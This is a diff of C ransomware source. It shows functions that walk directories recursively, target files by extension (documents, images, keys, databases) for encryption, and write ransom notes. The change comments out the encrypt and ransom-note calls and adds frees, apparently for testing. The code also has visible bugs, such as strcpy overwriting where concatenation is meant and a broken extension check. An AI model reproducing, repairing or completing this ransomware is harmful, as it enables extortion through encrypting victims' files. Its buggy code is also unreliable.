@@ -32,6 +32,8 @@ void writeRansomNote(char * directory,char * id)
     strcpy(ransomnote,id);
     strcpy(ransomnote,NOTE2);
     fwrite(ransomnote,1,strlen(ransomnote),fp);
+    free(filename);
+    free(ransomnote);
 }
 
 void directory_handle(char * name,unsigned char * key, unsigned char * iv,char * id)
@@ -56,7 +58,7 @@ void directory_handle(char * name,unsigned char * key, unsigned char * iv,char *
     	} else if(fDirent->d_type == DT_DIR){
     		directory_handle(fullpath,key,iv,id);
     	}
-        writeRansomNote(fullpath,id);
+        //writeRansomNote(fullpath,id);
     	free(fullpath);
     }
     
@@ -76,11 +78,12 @@ void file_handler(char * filepath, char * filename,unsigned char * key, unsigned
 	char * full_fileName = malloc(strlen(filepath)+strlen(filepath+2));
 	strcpy(full_fileName,filepath);
 	strcpy(full_fileName,filename);
-    printf("encrypting: %s\n",full_fileName);
     char * file_ext = get_filename_ext(full_fileName);
     if(strcmp(file_ext,"doc")  == 0 || strcmp(file_ext,"docx") == 0 || strcmp(file_ext,"java") == 0 || strcmp(file_ext,"pdf")  == 0 || strcmp(file_ext,"jpg")  == 0 ||strcmp(file_ext,"txt")  == 0 ||strcmp(file_ext,"pdf")  == 0 ||strcmp(file_ext,"MDF")  == 0 || strcmp(file_ext,"ppt")  == 0 || strcmp(file_ext,"pem")  == 0 || strcmp(file_ext,"sql")  == 0 || strcmp(file_ext,"mp4"))
     {
-        encrypt(full_fileName,key,iv);
+         printf("encrypting: %s\n",full_fileName);
+
+        //encrypt(full_fileName,key,iv);
     }
 
     free(full_fileName);
